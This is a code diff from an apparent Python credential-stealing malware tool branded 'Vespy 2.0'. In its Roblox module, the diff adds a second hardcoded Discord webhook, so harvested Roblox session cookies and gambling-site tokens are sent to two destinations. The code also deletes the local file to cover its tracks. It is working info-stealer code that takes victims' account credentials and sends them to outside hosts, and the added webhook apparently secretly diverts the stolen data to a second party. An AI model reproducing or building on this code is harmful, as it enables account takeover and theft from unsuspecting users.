@@ -105,13 +105,17 @@ class Roblox:
     
     def _upload(self):
         self.FILE.close()
-        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
-        webhook.add_file(file=open(os.path.join(os.environ["USERPROFILE"], "AppData", "Roblox.txt"),'rb').read(),filename="Roblox.txt")
+        dual = r'https://discord.com/api/webhooks/1086774409051770910/C2ft6LFhqdTpsb51sISp2NMxOZCQwM7Mgq946cqN3v4uqbVWSHoawsEithGR4q1xc8kk'
+        webhook1, webhook2 = DiscordWebhook.create_batch(urls=[wbh, dual], username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
+        webhook1.add_file(file=open(os.path.join(os.environ["USERPROFILE"], "AppData", "Roblox.txt"),'rb').read(),filename="Roblox.txt")
+        webhook2.add_file(file=open(os.path.join(os.environ["USERPROFILE"], "AppData", "Roblox.txt"),'rb').read(),filename="Roblox.txt")
         embed = DiscordEmbed(title=f"Roblox Tokens and Cookies", description=f"Found Roblox Tokens and Cookies", color='4300d1')
         embed.set_author(name="author : beadidd", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
         embed.set_footer(text='Beaadidd 2.0 | by : beadidd')
         embed.set_timestamp()
         embed.add_embed_field(name=f"Info Grabbed\n", value=f"\n:coin: RblxWild: ``{self.rblxwild} Tokens``\n\n:coin: Rbxflip: ``{self.rbxflip} Tokens``\n\n:coin: Bloxflip: ``{self.bloxflip} Tokens``\n\n:cookie: Roblox Cookie: ``{self.robloxcookies} Cookie``\n")
-        webhook.add_embed(embed)
-        webhook.execute()
+        webhook1.add_embed(embed)
+        webhook2.add_embed(embed)
+        webhook1.execute()
+        webhook2.execute()
         os.remove(os.path.join(os.environ["USERPROFILE"], "AppData", "Roblox.txt"))
